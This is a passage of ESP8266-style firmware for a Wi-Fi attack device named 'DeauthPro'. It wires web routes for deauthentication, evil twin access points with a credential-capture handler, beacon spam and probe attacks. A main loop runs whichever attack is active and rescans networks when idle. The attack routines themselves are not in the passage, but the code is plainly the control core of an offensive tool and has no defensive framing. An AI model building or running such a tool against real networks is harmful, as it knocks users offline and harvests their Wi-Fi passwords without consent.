  webServer.on("/deauth", handleDeauth);
  webServer.on("/startdeauth", HTTP_POST, handleStartDeauth);
  webServer.on("/eviltwin", handleEvilTwin);
  webServer.on("/starteviltwin", HTTP_POST, handleStartEvilTwin);
  webServer.on("/eviltwinauth", HTTP_POST, handleEvilTwinAuth); // NEW: Evil Twin auth handler
  webServer.on("/beaconssid", handleBeaconSSID); // NEW: Beacon SSID setup
  webServer.on("/setbeaconssid", HTTP_POST, handleSetBeaconSSID); // NEW: Set beacon SSID
  webServer.on("/beacon", handleBeacon);
  webServer.on("/probe", handleProbe);
  webServer.on("/stop", handleStop);
  
  webServer.begin();
}

void setup() {
  Serial.begin(115200);
  
  // Initialize components
  initDisplay();
  initButtons();
  initWiFi();
  initWebServer();
  
  // Configure LED - CORRECTED FOR ACTIVE LOW
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH); // Turn off LED initially (ACTIVE LOW)
  
  // Show startup screen
  display.clear();
  display.setFont(ArialMT_Plain_16);
  display.drawString(0, 0, "DeauthPro");
  display.setFont(ArialMT_Plain_10);
  display.drawString(0, 20, "v" + String(VERSION));
  display.drawString(0, 35, "Web: 192.168.4.1");
  display.drawString(0, 50, "SSID: DeauthPro");
  display.display();
  
  delay(3000);
  
  // Initial scan
  scanNetworks();
}

void loop() {
  // Handle web server
  webServer.handleClient();
  dnsServer.processNextRequest();
  
  // Handle buttons
  handleButtons();
  
  // Execute current attack
  executeAttack();
  
  // Update LED - NEW: Added LED control
  updateLED();
  
  // Update display
  static unsigned long lastDisplayUpdate = 0;
  if (millis() - lastDisplayUpdate > 100) {
    lastDisplayUpdate = millis();
    updateDisplay();
  }
  
  // Auto-rescan every 30 seconds if not attacking
  if (currentAttack == ATTACK_OFF && millis() - lastScanTime > 30000) {
    scanNetworks();
  }
}
